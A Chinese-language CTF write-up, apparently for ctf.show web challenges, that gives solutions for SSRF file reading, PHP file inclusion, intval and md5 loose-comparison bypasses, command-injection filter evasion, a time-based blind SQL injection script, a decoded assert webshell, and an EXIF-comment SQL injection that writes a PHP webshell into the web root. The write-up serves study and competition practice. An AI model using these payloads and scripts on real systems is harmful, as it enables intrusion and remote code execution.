<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;test&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;body &#123; background: white; &#125;&lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      var xhr = new XMLHttpRequest();</span><br><span class="line">      xhr.onload = function () &#123;</span><br><span class="line">        document.body.innerText = xhr.responseText;</span><br><span class="line">      &#125;;</span><br><span class="line">      xhr.open(&#x27;GET&#x27;, &#x27;file:///flag&#x27;);</span><br><span class="line">      xhr.send();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>让服务器访问这个就行</p>
<h2 id="ALL-INFO-U-WANT"><a href="#ALL-INFO-U-WANT" class="headerlink" title="ALL_INFO_U_WANT"></a>ALL_INFO_U_WANT</h2><p>很流畅的一道题</p>
<p>扫出index.php.bak</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">//give you all information you want</span><br><span class="line">if (isset($_GET[&#x27;all_info_i_want&#x27;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = &quot;/var/www/html/&quot; . $_GET[&#x27;file&#x27;];</span><br><span class="line">    //really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">really really really baby challenge right? </span><br></pre></td></tr></table></figure>

<p>include日志包含就行</p>
<p>但是real flag不在根目录，要在蚁剑shell找一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /etc -name &#x27;*&#x27; | xargs grep &quot;&#123;&quot;</span><br><span class="line">或者</span><br><span class="line">find /etc | xargs grep &quot;&#123;&quot;</span><br></pre></td></tr></table></figure>

<p>（只能用单引号，其他都报错 难绷</p>
<h2 id="WUSTCT-朴实无华-Revenge"><a href="#WUSTCT-朴实无华-Revenge" class="headerlink" title="WUSTCT_朴实无华_Revenge"></a>WUSTCT_朴实无华_Revenge</h2><p>进去就是经典闯关，先给一个判断回文的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isPalindrome($str)&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=1;</span><br><span class="line">    $k=intval($len/2)+1;</span><br><span class="line">    for($j=0;$j&lt;$k;$j++)</span><br><span class="line">        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123;</span><br><span class="line">            $l=0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    if ($l==1) return true;</span><br><span class="line">    else return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>level1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.-]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;非洲欢迎你1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class="line">        die(&quot;非洲欢迎你2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是传入num，经过intval和反向再intval后相等，且原始num不是回文</p>
<p>限定0-9.-</p>
<p>intval是转int的一个函数，会将浮点取整，字符取开头数字</p>
<p>有了提示的.-很容易想到一个payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=1.10</span><br><span class="line">intval-&gt;1;strrev-&gt;01.1-&gt;intval-&gt;1;非回文</span><br></pre></td></tr></table></figure>

<p>level2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">    $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">    if ($md5==md5(md5($md5)))</span><br><span class="line">        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双重md5之后相等，明显要求md5绕过，找到两次md5之后都是0e开头即可</p>
<p>0e开头弱比较会认为是科学计数法，0的n次方等于0的m次方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5_hash(s):</span><br><span class="line">    return hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">for i in range(1000000000001):</span><br><span class="line">    original_str = &quot;0e&quot; + str(i)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    first_hash = md5_hash(original_str)</span><br><span class="line">    second_hash = md5_hash(first_hash)</span><br><span class="line">    </span><br><span class="line">    if second_hash.startswith(&quot;0e&quot;) and second_hash[2:].isdigit():</span><br><span class="line">        print(original_str)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?md5=0e3900184182</span><br></pre></td></tr></table></figure>

<p>level3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最简单的一集，不能有空格，不能有上面的关键词</p>
<p><a href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctf里读取文件相关知识点总结</a></p>
<p>空格可以用&lt;或者制表符(Tab)代替，读取直接nl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?get_flag=nl&lt;/flag</span><br><span class="line">?get_flag=nl	/flag</span><br></pre></td></tr></table></figure>

<h2 id="Login-Only-For-36D"><a href="#Login-Only-For-36D" class="headerlink" title="Login_Only_For_36D"></a>Login_Only_For_36D</h2><p>F12提示</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402062107206.png" alt="image-20240206210743134"></p>
<p>name参数里必须带admin，fuzz之后被ban了挺多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;-&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;|&#x27;, &#x27; &#x27;, &#x27;select&#x27;, &#x27;union&#x27;, &#x27;updatexml&#x27;, &#x27;floor&#x27;, &#x27;rand&#x27;, &#x27;substr&#x27;, &#x27;mid&#x27;, &#x27;ascii&#x27;, &#x27;and&#x27;, &#x27;||&#x27;, &#x27;&amp;&amp;&#x27;]</span><br></pre></td></tr></table></figure>

<p>可以利用<code>/</code>，将admin后面的<code>&#39;</code>注释掉，达到这样的效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=1\&amp;pass=test</span><br><span class="line">-&gt;</span><br><span class="line">select * from 36d_user where username=&#x27;1\&#x27; and password=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure>

<p>传入数据库查询的username即为<code>1\&#39; and password=</code>，由于无回显，盲注即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://9420c6ec-8845-43b4-b94f-e1aa0543c453.challenge.ctf.show/index.php&quot;</span><br><span class="line">username = &quot;admin\\&quot;</span><br><span class="line">alphabet = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;j&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;,</span><br><span class="line">            &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;G&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,</span><br><span class="line">            &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 30):</span><br><span class="line">    for al in alphabet:</span><br><span class="line">        a_int = ord(al)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: username,</span><br><span class="line">            &#x27;password&#x27;: f&quot;or/**/if((ord(right(left(password,&#123;i&#125;),1))/**/in/**/(&#123;a_int&#125;)),sleep(3),1)#&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url, data=data, timeout=3)</span><br><span class="line">        except:</span><br><span class="line">            flag += chr(a_int)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="你取吧"><a href="#你取吧" class="headerlink" title="你取吧"></a>你取吧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$hint=file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;);</span><br><span class="line">$code=$_REQUEST[&#x27;code&#x27;];</span><br><span class="line">$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\~&#x27;,&#x27;\^&#x27;);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line">foreach ($blacklist as $blacklisted) &#123;</span><br><span class="line">    if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123;</span><br><span class="line">        die(&#x27;nonono&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval(&quot;echo($code);&quot;);</span><br></pre></td></tr></table></figure>

<p>要求不使用字母取反异或echo出东西，解法很多</p>
<p>预期解是访问<code>$_</code>中的键值拼接，最后用<code>$&#123;&#125;</code>构成$hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=$&#123;$_&#123;7&#125;.$_&#123;8&#125;.$_&#123;12&#125;.$_&#123;19&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>还有P牛的无数字webshell也能打</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<p>拿到zip源码，经过phpjiami跑过一遍</p>
<p>还是P牛</p>
<p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html">phpjiami 数种解密方法</a></p>
<p>hook eval的插件没成功，dump出来的</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402071522756.png" alt="image-20240207152255636"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?&gt;&lt;?php @eval(&quot;//Encode by  phpjiami.com,Free user.&quot;); ?&gt;&lt;?php</span><br><span class="line">$ch = explode(&quot;.&quot;,&quot;hello.ass.world.er.rt.e.saucerman&quot;);</span><br><span class="line">$c = $ch[1].$ch[5].$ch[4]; </span><br><span class="line">@$c($_POST[7-1]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php </span><br></pre></td></tr></table></figure>

<p>就是<code>assert($_POST[7-1]);)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">6=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>网上还抄了个解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data_1 = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        if ($ch &lt; 245) &#123;</span><br><span class="line">            if ($ch &gt; 136) &#123;</span><br><span class="line">                $data_1 .= chr($ch / 2);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = 32;</span><br><span class="line">    $data_2 = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        if ($j &lt;= 0) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    return $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_data($code)</span><br><span class="line">&#123;</span><br><span class="line">    $code_end = strrpos($code, &#x27;?&gt;&#x27;);</span><br><span class="line">    if (!$code_end) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + 2;</span><br><span class="line">    $data = substr($code, $data_start, -46);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_key($code)</span><br><span class="line">&#123;</span><br><span class="line">    // $v1 = $v2(&#x27;bWQ1&#x27;);</span><br><span class="line">    // $key1 = $v1(&#x27;??????&#x27;);</span><br><span class="line">    $pos1 = strpos($code, &quot;(&#x27;&quot; . preg_quote(base64_encode(&#x27;md5&#x27;)) . &quot;&#x27;);&quot;);</span><br><span class="line">    $pos2 = strrpos(substr($code, 0, $pos1), &#x27;$&#x27;);</span><br><span class="line">    $pos3 = strrpos(substr($code, 0, $pos2), &#x27;$&#x27;);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - 1);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, &quot;(&#x27;&quot;, $pos4);</span><br><span class="line">    $pos6 = strpos($code, &quot;&#x27;)&quot;, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2);</span><br><span class="line">    return $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[1];</span><br><span class="line">$output_file = $argv[1] . &#x27;.decrypted.php&#x27;;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line">if (!$code) &#123;</span><br><span class="line">    echo &#x27;未找到加密数据&#x27;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &#x27;未找到秘钥&#x27;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span><br><span class="line">if ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line">echo &#x27;解密后文件已写入到 &#x27;, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF-朴实无华-Revenge-Revenge"><a href="#WUSTCTF-朴实无华-Revenge-Revenge" class="headerlink" title="WUSTCTF_朴实无华_Revenge_Revenge"></a>WUSTCTF_朴实无华_Revenge_Revenge</h2><p>只有level1和getflag改了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;非洲欢迎你1&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( (preg_match_all(&quot;/\./&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num)==1 &amp;&amp; !preg_match(&#x27;/^[-]/&#x27;, $num))) &#123;</span><br><span class="line">            die(&quot;没有这样的数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($num != $numPositve) &#123;</span><br><span class="line">        die(&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class="line">        die(&quot;非洲欢迎你2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只允许<code>0-9.</code>还加了<code>$num != $numPositve</code>就是要传入的<code>num</code>和intval处理后的<code>num</code>相等，</p>
<p>利用php浮点精度</p>
<blockquote>
<p>浮点数的字长和平台相关，尽管通常最大值是 1.8e308 并具有 14 位十进制数字的精度（64 位 IEEE 格式）。</p>
<p><strong>警告</strong></p>
<h2 id="浮点数的精度"><a href="#浮点数的精度" class="headerlink" title="浮点数的精度"></a>浮点数的精度</h2><p>浮点数的精度有限。尽管取决于系统，PHP 通常使用 IEEE 754 双精度格式，则由于取整而导致的最大相对误差为 1.11e-16。非基本数学运算可能会给出更大误差，并且要考虑到进行复合运算时的误差传递。</p>
<p>此外，以十进制能够精确表示的有理数如 <code>0.1</code> 或 <code>0.7</code>，无论有多少尾数都不能被内部所使用的二进制精确表示，因此不能在不丢失一点点精度的情况下转换为二进制的格式。这就会造成混乱的结果：例如，<code>floor((0.1+0.7)*10)</code> 通常会返回 <code>7</code> 而不是预期中的 <code>8</code>，因为该结果内部的表示其实是类似 <code>7.9999999999999991118...</code>。</p>
<p>所以永远不要相信浮点数结果精确到了最后一位，也永远不要比较两个浮点数是否相等。如果确实需要更高的精度，应该使用<a href="https://www.php.net/manual/zh/ref.bc.php">任意精度数学函数</a>或者 <a href="https://www.php.net/manual/zh/ref.gmp.php">gmp 函数</a>。</p>
<p>参见<a href="http://floating-point-gui.de/">» 浮点数指南</a>网页的简单解释。</p>
</blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(1.000000000000001 == 1);         # bool(false)</span><br><span class="line">var_dump(1.0000000000000001 == 1);        # bool(true)</span><br><span class="line">var_dump(1.0000000000000001 === 1);       # bool(false)</span><br></pre></td></tr></table></figure>

<p>为了绕过回文，后边再加一个0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=1000000000000000.00000000000000010</span><br></pre></td></tr></table></figure>

<p>getflag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        if (preg_match(&quot;/[&#x27;\*\&quot;[?]/&quot;, $get_flag)) &#123;</span><br><span class="line">            die(&#x27;非预期修复*2&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把nl给ban了，继续抄🐶爹的</p>
<p><a href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctf里读取文件相关知识点总结</a></p>
<p>空格用<code>&lt;</code>或者<code>%09</code>，读取用<code>base64</code>或者<code>ca\t</code>，<code>php</code>换成<code>ph\p</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?get_flag=base64&lt;flag.ph\p</span><br></pre></td></tr></table></figure>

<h2 id="你没见过的注入"><a href="#你没见过的注入" class="headerlink" title="你没见过的注入"></a>你没见过的注入</h2><p>这题也真够抽象的，确实是没见过😅</p>
<p>先说不用扫，结果还是要访问robots.txt，拿到重置密码的网址<code>/pwdreset.php</code></p>
<p>直接重置密码，进去是个文件上传，无过滤</p>
<p>文件上传后，在后端会被重命名+压缩处理，无利用空间，只有个<code>filetype</code>进行提示</p>
<p>传个php-&gt;<code>filetype:PHP script, ASCII text, with CRLF line terminators</code></p>
<p>看了源码才知道限制了10k</p>
<blockquote>
<p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt; <a href="https://exiftool.org/">https://exiftool.org/</a></p>
<p>可以编辑图片的的<code>EXIF</code>信息</p>
<p>payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;./exiftool -overwrite_original -comment=<span class="string">&quot;y1ng\&quot;&#x27;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#x27;/var/www/html/1.php&#x27;;#&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hex(&lt;?=$_POST[0];)=0x3C3F3D60245F504F53545B305D603B</span><br></pre></td></tr></table></figure>
</blockquote>
<p>不知道哪试出来的从exif信息里注</p>
<p>upload源码</p>
